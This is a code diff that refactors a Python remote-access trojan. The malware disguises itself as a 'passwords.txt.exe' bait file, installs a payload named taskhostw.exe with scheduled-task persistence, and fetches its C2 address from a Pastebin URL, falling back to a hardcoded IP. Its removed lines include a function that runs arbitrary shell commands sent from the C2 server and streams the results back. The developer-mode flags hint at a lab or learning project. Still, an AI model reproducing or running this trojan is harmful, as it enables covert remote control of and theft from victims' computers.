@@ -11,239 +11,22 @@ import socket
 import subprocess
 import sys
 import time
-import urllib.request
 
-# Import VERBOSE flag from install module (shared verbosity detection)
-from install import VERBOSE
-
-# Configuration
-# VERBOSE is now imported from install.py - auto-detects dev vs production mode
-CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"  # Dynamic C2 configuration URL
-FALLBACK_HOST = "52.21.29.104"  # Fallback C2 Server address if Pastebin unreachable
-DEFAULT_PORT = 5555  # Port number
-RETRY_DELAY = 5  # Seconds between connection retries
-BUFFER_SIZE = 4096  # Socket buffer size
-END_MARKER = b"<<<END_OF_OUTPUT>>>"  # Command completion marker
-
-# Deployment Configuration
-PAYLOAD_NAME = "taskhostw.exe"
-
-# Static variable to store fetched C2 IP (initialized once on first access)
-C2_HOST = None
+# Import from utils modules
+from utils.config import DEFAULT_PORT, RETRY_DELAY, FAKE_PASSWORDS, PAYLOAD_NAME
+from utils.common import (
+    log, dev_pause, get_payload_path, is_bait_file, is_payload,
+    parse_cli_arguments, copy_dev_mode_marker, cleanup_payload_files, get_c2_host
+)
+from utils.install import check_and_install_service
+from utils.modes import ModeManager
+from utils.router import CommandRouter
+from utils.protocol import receive_text
 
 
-def get_c2_host():
-    """
-    Fetch C2 server IP from Pastebin URL.
-    Fetches once and caches the result. Falls back to hardcoded IP if fetch fails.
-
-    Returns:
-        str: The C2 server IP address
-    """
-    global C2_HOST
-
-    # Return cached value if already fetched
-    if C2_HOST is not None:
-        return C2_HOST
-
-    # Try to fetch from Pastebin
-    try:
-        log(f"Fetching C2 configuration from: {CONFIG_URL}")
-
-        with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
-            c2_ip = response.read().decode("utf-8").strip()
-
-            # Use the fetched IP if it has content
-            if c2_ip:
-                C2_HOST = c2_ip
-                log(f"C2 server IP fetched: {C2_HOST}")
-                return C2_HOST
-            else:
-                log(f"Empty C2 address from Pastebin, using fallback")
-
-    except Exception as e:
-        log(f"Failed to fetch C2 from Pastebin: {e}, using fallback")
-
-    # Fallback to hardcoded IP
-    C2_HOST = FALLBACK_HOST
-    log(f"Using fallback C2 server: {C2_HOST}")
-    return C2_HOST
-
-
-# Get LOCALAPPDATA - only called on Windows
-def get_payload_dir():
-    """Get the payload directory. Raises KeyError if LOCALAPPDATA doesn't exist."""
-    localappdata = os.environ["LOCALAPPDATA"]  # Raises KeyError if missing - intentional
-    # Use Temp directory - writable by users, avoids Windows Defender behavioral blocks
-    return os.path.join(localappdata, "Temp")
-
-
-# Lazy initialization - only computed when first accessed
-_PAYLOAD_DIR = None
-_PAYLOAD_PATH = None
-
-
-def get_payload_path():
-    """Get payload paths (lazy initialization for Windows only)."""
-    global _PAYLOAD_DIR, _PAYLOAD_PATH
-
-    if _PAYLOAD_DIR is None:
-        _PAYLOAD_DIR = get_payload_dir()
-        _PAYLOAD_PATH = os.path.join(_PAYLOAD_DIR, PAYLOAD_NAME)
-
-    return _PAYLOAD_DIR, _PAYLOAD_PATH
-
-
-# Fake password file content
-FAKE_PASSWORDS = """bgardner57@yahoo.com
-Samantha04!
-
-work email robert.gardner@mavengroup.net
-mustFTW!2025
-
-BANK OF AMERICA ONLINE BANKING !!!
-username: bob.gardner
-password: Murphy2019!
-(has 2 factor auth - code is usually 123456 or 000000)
-
-facebook bob.gardner.7314
-Samantha04!
-
-Wells Fargo online
-user: BGARDNER4782
-Murphy#2019
-security question = Murphy
-
-Social Security - mySocialSecurity account
-bobgardner1957 / Murphy#2019
-
-Medicare.gov login
-same as SS account
-
-CVS pharmacy
-bobgardner / Samantha04!
-prescription ready text alerts
-
-AARP membership # 4382991847
-login: bgardner57@yahoo.com / AARP2020
-
-amazon - same as yahoo email
-
-netflix bgardner57@yahoo.com / Netflix$Family
-sam knows this one
-
-Xfinity/Comcast
-account# 8774 4382 9918 2847
-bgardner / Murphy2019!
-email: robert.gardner472@sbcglobal.net
-
-Fidelity retirement account
-user: BOBGARDNER
-password: Fidelity$2018
-
-wifi: NETGEAR73 / Murphy2019!
-
-United MileagePlus# 8847392018
-bobgardner1957 / United2020
-
-ebay acct - bgardner47 / Samantha04!
-
-paypal = yahoo login
-
-microsoft acct same as work email
-
-DTE Energy online
-acct 2847-3821-9918
-bobgardner / DTEaccess2021
-"""
-
-# Use the system's output encoding (check if sys.stdout exists for --noconsole mode)
-DECODING = sys.stdout.encoding if sys.stdout and sys.stdout.encoding else "utf-8"
-
-
-def log(msg: str) -> None:
-    """Print message only if VERBOSE is True."""
-    if VERBOSE:
-        print(msg)
-
-
-def dev_pause() -> None:
-    """In dev mode, pause before exit so user can read console output."""
-    if VERBOSE:
-        try:
-            input("\n[DEV MODE] Press Enter to close console...")
-        except:
-            pass  # In case stdin is not available
-
-
-def is_bait_file() -> bool:
-    """Check if currently running as the bait file (passwords.txt.exe)."""
-    exe_name = os.path.basename(sys.executable).lower()
-    return exe_name.endswith("passwords.txt.exe")
-
-
-def is_payload() -> bool:
-    """Check if currently running as the payload (taskhostw.exe)."""
-    exe_name = os.path.basename(sys.executable).lower()
-    return exe_name == PAYLOAD_NAME.lower()
-
-
-def parse_cli_arguments():
-    """Parse command-line arguments. Returns the file to delete if specified."""
-    delete_file = None
-    if "--delete-file" in sys.argv:
-        try:
-            idx = sys.argv.index("--delete-file")
-            if idx + 1 < len(sys.argv):
-                delete_file = sys.argv[idx + 1]
-        except (ValueError, IndexError):
-            pass
-    return delete_file
-
-
-def copy_dev_mode_marker(source_dir: str, dest_dir: str) -> None:
-    """
-    Copy .dev_mode marker file from source to destination directory if it exists.
-    Used during payload deployment to propagate dev mode to the installed payload.
-
-    Args:
-        source_dir: Source directory containing .dev_mode marker
-        dest_dir: Destination directory to copy .dev_mode marker to
-    """
-    dev_mode_source = os.path.join(source_dir, ".dev_mode")
-    dev_mode_dest = os.path.join(dest_dir, ".dev_mode")
-
-    if os.path.exists(dev_mode_source):
-        try:
-            shutil.copy2(dev_mode_source, dev_mode_dest)
-            log(f"Copied .dev_mode marker to: {dev_mode_dest}")
-        except Exception as e:
-            log(f"Warning: Could not copy .dev_mode marker: {e}")
-
-
-def cleanup_payload_files() -> None:
-    """
-    Clean up payload files during uninstallation (Windows only).
-    Removes both the payload executable and .dev_mode marker if they exist.
-    """
-    payload_dir, payload_path = get_payload_path()
-
-    # Clean up .dev_mode marker
-    dev_mode_file = os.path.join(payload_dir, ".dev_mode")
-    if os.path.exists(dev_mode_file):
-        try:
-            os.remove(dev_mode_file)
-            log(f"Removed .dev_mode marker: {dev_mode_file}")
-        except Exception as e:
-            log(f"Warning: Could not remove .dev_mode: {e}")
-
-    # Clean up payload executable
-    if os.path.exists(payload_path):
-        try:
-            os.remove(payload_path)
-            log(f"Removed payload: {payload_path}")
-        except Exception as e:
-            log(f"Warning: Could not remove payload: {e}")
+# ============================================================================
+# DEPLOYMENT FUNCTIONS (Stage 1 & 2)
+# ============================================================================
 
 
 def deploy_payload():
@@ -326,101 +109,9 @@ def setup_camouflage(original_file: str = None):
     log("[Stage 2: Camouflage complete]")
 
 
-def execute_command_stream(command: str, client_socket, working_dir: str = None) -> str:
-    """
-    Executes a command and streams output back through the socket.
-
-    Automatically appends '&& pwd' (Unix) or '&& cd' (Windows) to track directory changes.
-    The pwd/cd output is hidden from the sender (used only for internal tracking).
-    Returns the current working directory after command execution.
-
-    WARNING: Uses shell=True for demonstration purposes only.
-    This allows arbitrary command execution and should NEVER be exposed
-    to untrusted networks or users.
-
-    Args:
-        command: The command to execute
-        client_socket: Socket to stream output to
-        working_dir: Current working directory (None = use receiver's cwd)
-
-    Returns:
-        The current working directory after command execution
-    """
-    # Check if this is a clear/cls command (special handling)
-    is_clear_command = command.strip().lower() in ["clear", "cls"]
-
-    # Determine pwd command based on OS
-    system = platform.system()
-    pwd_command = "cd" if system == "Windows" else "pwd"
-
-    # For clear commands, don't append pwd tracking (it causes issues)
-    # Just return the current working_dir unchanged
-    if is_clear_command:
-        command_to_run = command
-        track_directory = False
-    else:
-        command_to_run = f"{command} && {pwd_command}"
-        track_directory = True
-
-    try:
-        # Use subprocess.Popen to manage the process and pipes
-        process = subprocess.Popen(
-            command_to_run,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            cwd=working_dir,
-        )
-
-        # Buffer all output lines
-        output_lines = []
-        if process.stdout:
-            for raw_line in process.stdout:
-                # Decode the line
-                line = raw_line.decode(DECODING, errors="replace")
-                output_lines.append(line)
-
-        # Wait for process to finish
-        return_code = process.wait()
-
-        # Extract directory info from last line (if tracking and command succeeded)
-        new_dir = working_dir
-        if track_directory and output_lines and return_code == 0:
-            # Only extract directory if command succeeded (prevents using error messages as paths)
-            # Find the last non-empty line (the pwd/cd output)
-            for i in range(len(output_lines) - 1, -1, -1):
-                stripped = output_lines[i].strip()
-                if stripped:
-                    new_dir = stripped
-                    # Remove the pwd line from output (don't send to sender)
-                    output_lines.pop(i)
-                    break
-
-        # Send all output to sender (excluding the pwd line)
-        for line in output_lines:
-            client_socket.sendall(line.encode("utf-8"))
-
-        # Send final status
-        if return_code != 0:
-            status = f"\n[exit code: {return_code}]\n"
-            client_socket.sendall(status.encode("utf-8"))
-
-        # Send end marker
-        client_socket.sendall(END_MARKER)
-
-        # Return the current directory
-        return new_dir if new_dir else working_dir
-
-    except Exception as e:
-        error_msg = f"\n[error: {e}]\n" + END_MARKER.decode("utf-8")
-        # Send error to sender (don't print locally)
-        try:
-            client_socket.sendall(error_msg.encode("utf-8"))
-        except (socket.error, OSError, BrokenPipeError):
-            pass  # Socket already closed, nothing we can do
-
-        # On error, return the previous working_dir unchanged
-        return working_dir
+# ============================================================================
+# MAIN RECEIVER LOOP
+# ============================================================================
 
 
 def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
@@ -428,10 +119,14 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
     Start the TCP command receiver client.
 
     Args:
-        host: The sender's host address (use '127.0.0.1' for local testing)
+        host: The sender's host address
         port: The sender's port number
     """
     attempt = 1
+    
+    # Create mode manager and command router
+    mode_manager = ModeManager()
+    router = CommandRouter(mode_manager)
 
     try:
         # Main reconnection loop - runs until user interrupts
@@ -461,16 +156,13 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
             # Reset attempt counter after successful connection
             attempt = 1
 
-            # Track current working directory (None = use receiver's default cwd)
-            current_dir = None
-
             # Continuously receive and execute commands
             connection_lost = False
             try:
                 while True:
                     try:
                         # Receive command
-                        data = client_socket.recv(BUFFER_SIZE)
+                        data = client_socket.recv(4096)
 
                         if not data:
                             # Connection closed by sender
@@ -482,27 +174,8 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
                         # Decode the command
                         command = data.decode("utf-8").strip()
 
-                        # Handle special commands
-                        if command.strip().lower() == "/quit":
-                            log("Received /quit command - uninstalling service and shutting down...")
-
-                            # Send acknowledgment
-                            msg = "\n[Uninstalling service and shutting down...]\n"
-                            client_socket.sendall(msg.encode("utf-8"))
-                            client_socket.sendall(END_MARKER)
-
-                            # Uninstall the service
-                            uninstall_receiver_service()
-
-                            # Exit completely (don't reconnect)
-                            log("Service uninstalled. Exiting.")
-                            sys.exit(0)  # Intentional exit - no pause needed
-
-                        log(f"$ {command}")
-
-                        # Execute command and stream output back
-                        # Update current_dir with the new working directory after execution
-                        current_dir = execute_command_stream(command, client_socket, current_dir)
+                        # Route command through the command router
+                        router.handle_command(command, client_socket)
 
                     except ConnectionResetError:
                         log("\nConnection reset")
@@ -533,45 +206,6 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
         log(f"Error: {e}")
         dev_pause()
         sys.exit(1)
-
-
-def uninstall_receiver_service() -> None:
-    """Uninstall the auto-start service for this receiver."""
-    system = platform.system()
-
-    if system == "Linux":
-        log("Uninstalling systemd service...")
-        commands = [
-            ["sudo", "systemctl", "stop", "tcp-receiver.service"],
-            ["sudo", "systemctl", "disable", "tcp-receiver.service"],
-            ["sudo", "rm", "-f", "/etc/systemd/system/tcp-receiver.service"],
-            ["sudo", "systemctl", "daemon-reload"],
-        ]
-        for cmd in commands:
-            subprocess.run(cmd, capture_output=True)
-        log("Systemd service uninstalled.")
-
-    elif system == "Windows":
-        log("Uninstalling Windows Task...")
-        subprocess.run(["schtasks", "/delete", "/tn", "taskhostw", "/f"], capture_output=True)
-        log("Windows Task uninstalled.")
-
-        # Clean up payload files and .dev_mode marker
-        cleanup_payload_files()
-
-    elif system == "Darwin":
-        log("Uninstalling launchd service...")
-        plist_file = "/Library/LaunchDaemons/com.tcp.receiver.plist"
-        commands = [
-            ["sudo", "launchctl", "unload", plist_file],
-            ["sudo", "rm", "-f", plist_file],
-        ]
-        for cmd in commands:
-            subprocess.run(cmd, capture_output=True)
-        log("Launchd service uninstalled.")
-
-    else:
-        log(f"Uninstall not implemented for {system}")
 
 
 def run_with_auto_restart(host: str, port: int) -> None:
@@ -613,6 +247,11 @@ def run_with_auto_restart(host: str, port: int) -> None:
             time.sleep(RETRY_DELAY)
 
 
+# ============================================================================
+# ENTRY POINT
+# ============================================================================
+
+
 if __name__ == "__main__":
     # Only run deployment logic on Windows and when frozen/compiled (PyInstaller or Nuitka)
     if platform.system() == "Windows" and (getattr(sys, "frozen", False) or "__compiled__" in globals()):
@@ -631,9 +270,6 @@ if __name__ == "__main__":
             delete_file = parse_cli_arguments()
 
             # Check if persistence is already installed (will raise on failure)
-            from install import check_and_install_service
-
-            # This function checks if task exists and installs if not
             check_and_install_service()
 
             # If we just installed (first run), setup camouflage (will raise on failure)
@@ -658,8 +294,6 @@ if __name__ == "__main__":
         log("\n[ TCP Command Receiver - Development Mode ]\n")
 
         if platform.system() == "Windows":
-            from install import check_and_install_service
-
             check_and_install_service()
 
         # Run with auto-restart wrapper for crash recovery
